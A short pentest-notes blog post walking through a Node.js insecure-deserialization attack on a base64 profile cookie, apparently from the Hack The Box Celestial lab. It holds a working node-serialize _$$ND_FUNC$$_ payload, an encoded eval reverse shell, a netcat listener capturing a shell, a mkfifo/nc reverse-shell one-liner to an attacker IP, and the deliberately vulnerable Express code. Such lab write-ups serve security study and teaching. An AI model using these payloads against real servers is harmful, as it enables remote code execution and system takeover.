---
layout: post
title: Node JS Deserialization - Cookie
description: Node JS Deserialization - Cookie
summary: Node JS Deserialization - Cookie
tags: [nodejs,deserialization,foothold]
minute: 1
---
## Overview
Attacker can obtain RCE by injecting malicious javascript payload on cookies using `eval()` method.

## Environment Setup
* Vulnerable app provides base64 encoded cookie

![](/spindel/assets/Node%20JS%20Deserialization%20-%20Cookie/F384E27F-729C-441E-AB46-6202061374F3.png)

## Steps
* Verify that app is vulnerable to [[Insecure Deserialization]] by manipulating the cookie

![](/spindel/assets/Node%20JS%20Deserialization%20-%20Cookie/05887E32-3C3F-4611-8183-95D109A19F19.png)

* Open netcat listener on attacker machine and generate [nodejs reverse shell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py)

```bash
➜  celestial python2 ~/data/tools/webapp/nodejsshell.py 10.10.14.13 4444
[+] LHOST = 10.10.14.13
[+] LPORT = 4444
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32[...redacted...],14,44,80,79,82,84,41,59,10))
➜  celestial
```

* Construct the payload by copying the generated `eval()` statement from command above to `username` variable of cookie

```bash
# this will put the base64 encoded output to your clipboard
echo -n '{"username":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,3
[...redacted...]184,44,80,79,82,84,41,59,10))}()","country":"rce","city":"rce","num":"100"}' | base64 -w0 | xclip -selection clipboard
```

* Paste the cookie in burp and wait for reverse shell connection

![](/spindel/assets/Node%20JS%20Deserialization%20-%20Cookie/9E4C6140-18E9-4211-9E1C-7F324D8C029F.png)

```bash
➜  celestial rlwrap nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.85] 56596
Connected!
id
uid=1000(sun) gid=1000(sun) groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

## Alternatives
* Another payload you can use is via `child_process` module

```
{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })","country":"Lameville","city":"Lametown","num":"2"}
```

## Application Code
Here is the vulnerable app.

```javascript
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();

   // Vulnerable part of code
   var obj = serialize.unserialize(str);
   if (obj.username) { 
     var sum = eval(obj.num + obj.num);
     res.send("Hey " + obj.username + " " + obj.num + " + " + obj.num + " is " + sum);
   }else{
     res.send("An error occurred...invalid username type"); 
   }
}else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("<h1>404</h1>");
});
app.listen(3000);
```

## Reference
* [HTB Celestial](https://www.youtube.com/watch?v=aS6z4NgRysU)